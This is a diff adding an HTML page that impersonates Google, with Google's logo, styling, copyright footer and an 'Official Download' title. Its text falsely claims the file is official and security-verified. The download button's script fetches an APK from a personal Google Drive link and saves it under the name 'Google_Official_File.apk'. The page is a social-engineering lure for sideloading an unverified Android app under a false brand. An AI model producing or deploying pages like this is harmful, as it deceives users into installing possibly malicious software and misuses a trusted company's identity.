@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Google - Official Download</title>
+    <link
+      rel="icon"
+      href="https://ssl.gstatic.com/images/branding/product/2x/google_fav_48dp.png"
+      type="image/png"
+    />
+    <style>
+      /* Global Styling */
+      body {
+        margin: 0;
+        font-family: "Google Sans", "Roboto", Arial, sans-serif; /* Prioritizing Google's own fonts */
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        background: #f8f9fa; /* Light, clean background, typical for Google */
+        color: #3c4043; /* Standard Google text color */
+        overflow: hidden;
+        padding: 20px;
+        box-sizing: border-box;
+      }
+
+      .container {
+        text-align: center;
+        width: 100%;
+        max-width: 580px; /* Slightly adjusted max-width for a focused look */
+        padding: 50px; /* Increased padding for more breathing room */
+        background-color: #ffffff; /* Pure white background */
+        border-radius: 8px; /* Standard, slightly rounded corners like Google apps */
+        box-shadow: 0 1px 3px 0 rgba(60, 64, 67, 0.3),
+          0 4px 8px 3px rgba(60, 64, 67, 0.15); /* Official Google-like shadow */
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        transform: scale(1);
+        animation: fadeIn 0.8s ease-out; /* Faster, smoother fade-in */
+      }
+
+      @keyframes fadeIn {
+        0% {
+          opacity: 0;
+          transform: translateY(20px) scale(0.98);
+        }
+        100% {
+          opacity: 1;
+          transform: translateY(0) scale(1);
+        }
+      }
+
+      .logo img {
+        width: 150px; /* Adjusted logo size for formality */
+        margin-bottom: 40px; /* More space below the logo */
+        animation: none; /* Removed playful animations for a more professional look */
+      }
+
+      .title {
+        font-size: 34px; /* Larger, clearer title */
+        font-weight: 500; /* Medium weight, common in Google UI */
+        color: #202124; /* Darker, more official text color */
+        margin-bottom: 25px;
+        letter-spacing: -0.5px; /* Tighter letter spacing */
+        text-shadow: none; /* Removed text shadow for a flat, modern look */
+      }
+
+      .description {
+        font-size: 16px; /* Standard readability font size */
+        color: #5f6368; /* Greyish text color for secondary info */
+        margin-bottom: 40px;
+        line-height: 1.6;
+        text-align: center; /* Ensure text is centered */
+      }
+
+      .download-button {
+        padding: 12px 24px; /* Standard button padding */
+        font-size: 16px; /* Clear button text size */
+        font-weight: 500; /* Medium weight */
+        border: 1px solid #dadce0; /* Subtle border for better definition */
+        border-radius: 4px; /* Less rounded, more professional corners */
+        background-color: #1a73e8; /* Google blue */
+        color: white;
+        cursor: pointer;
+        transition: all 0.2s ease; /* Faster transition for snappier feel */
+        box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3),
+          0 1px 3px 1px rgba(60, 64, 67, 0.15); /* Consistent shadow */
+        display: inline-flex; /* Use inline-flex for alignment */
+        align-items: center;
+        justify-content: center;
+        gap: 8px; /* Smaller gap for compactness */
+      }
+
+      .download-button::before {
+        content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>'); /* Official-looking download icon SVG */
+        vertical-align: middle;
+      }
+
+      .download-button:hover {
+        background-color: #186adc; /* Slightly darker blue on hover */
+        box-shadow: 0 1px 3px 0 rgba(60, 64, 67, 0.3),
+          0 4px 8px 3px rgba(60, 64, 67, 0.15); /* Maintained shadow */
+      }
+
+      .download-button:active {
+        background-color: #175cd3; /* Even darker blue on click */
+        box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3),
+          0 2px 6px 2px rgba(60, 64, 67, 0.15); /* Slightly depressed shadow */
+        transform: translateY(
+          0
+        ); /* Removed scale effect for more standard button behavior */
+      }
+
+      .footer {
+        font-size: 12px; /* Smaller, standard legal text size */
+        color: #70757a; /* Muted grey for legal text */
+        margin-top: 50px; /* Increased space for formality */
+        font-family: "Roboto", Arial, sans-serif;
+        animation: slideUp 0.6s ease-out forwards;
+        opacity: 0;
+      }
+
+      @keyframes slideUp {
+        0% {
+          transform: translateY(
+            10px
+          ); /* Smaller translateY for subtle effect */
+          opacity: 0;
+        }
+        100% {
+          transform: translateY(0);
+          opacity: 1;
+        }
+      }
+
+      /* No interactive effects on container or footer on hover for a more static, official feel */
+      .container:hover {
+        transform: scale(1); /* No scaling on hover */
+        box-shadow: 0 1px 3px 0 rgba(60, 64, 67, 0.3),
+          0 4px 8px 3px rgba(60, 64, 67, 0.15); /* Maintain original shadow */
+      }
+
+      /* Media queries for responsiveness */
+      @media (max-width: 768px) {
+        .container {
+          padding: 40px 30px;
+          margin: 0 15px;
+        }
+        .logo img {
+          width: 130px;
+        }
+        .title {
+          font-size: 28px;
+        }
+        .description {
+          font-size: 15px;
+        }
+        .download-button {
+          padding: 10px 20px;
+          font-size: 15px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .container {
+          padding: 30px 20px;
+        }
+        .title {
+          font-size: 24px;
+        }
+        .description {
+          font-size: 14px;
+        }
+        .download-button {
+          font-size: 14px;
+          padding: 10px 18px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">
+        <img
+          src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
+          alt="Google Logo"
+        />
+      </div>
+
+      <div class="title">Official Download</div>
+      <div class="description">
+        You are about to download an official file provided by Google. This file
+        has been verified for security and integrity to ensure a safe and smooth
+        download experience for you.
+      </div>
+      <button class="download-button" onclick="downloadApk()">
+        Download Now
+      </button>
+
+      <div class="footer">© 2025 Google LLC. All rights reserved.</div>
+    </div>
+
+    <script>
+      function downloadApk() {
+        var fileUrl =
+          "https://drive.usercontent.google.com/u/0/uc?id=1sT838QRvIwter_hshwv_eapaNiLiNurv&export=download&authuser=0"; // Ganti dengan URL file yang benar
+
+        // Membuat elemen 'a' sementara untuk men-trigger download
+        var link = document.createElement("a");
+        link.href = fileUrl; // URL file yang akan didownload
+        link.download = "Google_Official_File.apk"; // Nama file yang akan didownload
+
+        // Menambahkan elemen 'a' ke DOM dan mensimulasikan klik untuk memulai download
+        document.body.appendChild(link);
+        link.click();
+
+        // Menghapus elemen 'a' setelah klik untuk membersihkan DOM
+        document.body.removeChild(link);
+      }
+    </script>
+  </body>
+</html>
